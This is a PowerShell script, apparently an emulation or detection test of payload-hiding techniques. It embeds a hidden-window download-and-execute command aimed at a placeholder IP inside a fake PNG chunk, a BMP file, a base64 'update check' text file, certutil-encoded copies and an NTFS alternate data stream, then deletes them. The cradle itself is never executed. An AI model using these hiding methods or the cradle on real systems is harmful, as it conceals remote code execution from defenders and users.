$img = "$env:TEMP\update_logo.png"
$payload = [System.Text.Encoding]::UTF8.GetBytes("powershell -ep bypass -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.1/shell.ps1')`"")
$pngHeader = [byte[]]@(0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A)
$ihdr = [byte[]]@(0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x08,0x02,0x00,0x00,0x00,0x90,0x77,0x53,0xDE)
$fakeChunk = [byte[]]@(0x00,0x00,0x01,0x00,0x74,0x45,0x58,0x74) + $payload + [byte[]]@(0x00,0x00,0x00,0x00)
$iend = [byte[]]@(0x00,0x00,0x00,0x00,0x49,0x45,0x4E,0x44,0xAE,0x42,0x60,0x82)
[System.IO.File]::WriteAllBytes($img, $pngHeader + $ihdr + $fakeChunk + $iend)

$extracted = [System.IO.File]::ReadAllBytes($img)
$marker = [System.Text.Encoding]::ASCII.GetString($extracted) | Select-String -Pattern "powershell.*DownloadString" -AllMatches
if ($marker) {
    $decoded = $marker.Matches[0].Value
    $scriptBlock = [ScriptBlock]::Create("Write-Output 'STEG_EXTRACTED'")
    & $scriptBlock
}

$bmpPayload = "$env:TEMP\report.bmp"
$bmpHeader = [byte[]]@(0x42,0x4D) + [BitConverter]::GetBytes(1078 + $payload.Length) + (New-Object byte[] 4) + [BitConverter]::GetBytes(1078)
$dibHeader = [BitConverter]::GetBytes(40) + [BitConverter]::GetBytes(1) + [BitConverter]::GetBytes(1) + [byte[]]@(0x01,0x00,0x18,0x00) + (New-Object byte[] 24)
$bmpData = $bmpHeader + $dibHeader + (New-Object byte[] (1078 - 54)) + $payload
[System.IO.File]::WriteAllBytes($bmpPayload, $bmpData)

$b64Payload = [Convert]::ToBase64String($payload)
$hiddenScript = "$env:TEMP\update_check.txt"
"# Routine update check`n$b64Payload" | Out-File $hiddenScript -Force
$recoveredBytes = [Convert]::FromBase64String(($b64Payload))
$recoveredCmd = [System.Text.Encoding]::UTF8.GetString($recoveredBytes)

& certutil.exe -encode "$img" "$env:TEMP\encoded_img.b64" 2>&1 | Out-Null
& certutil.exe -decode "$env:TEMP\encoded_img.b64" "$env:TEMP\decoded_img.png" 2>&1 | Out-Null

$altDS = "$env:TEMP\legit_doc.txt"
"Normal document content" | Out-File $altDS -Force
try { Set-Content -Path "${altDS}:hidden" -Value $b64Payload -ErrorAction Stop } catch {}
try { $secret = Get-Content -Path "${altDS}:hidden" -ErrorAction Stop } catch {}

Remove-Item $img,$bmpPayload,$hiddenScript,"$env:TEMP\encoded_img.b64","$env:TEMP\decoded_img.png",$altDS -Force -ErrorAction SilentlyContinue
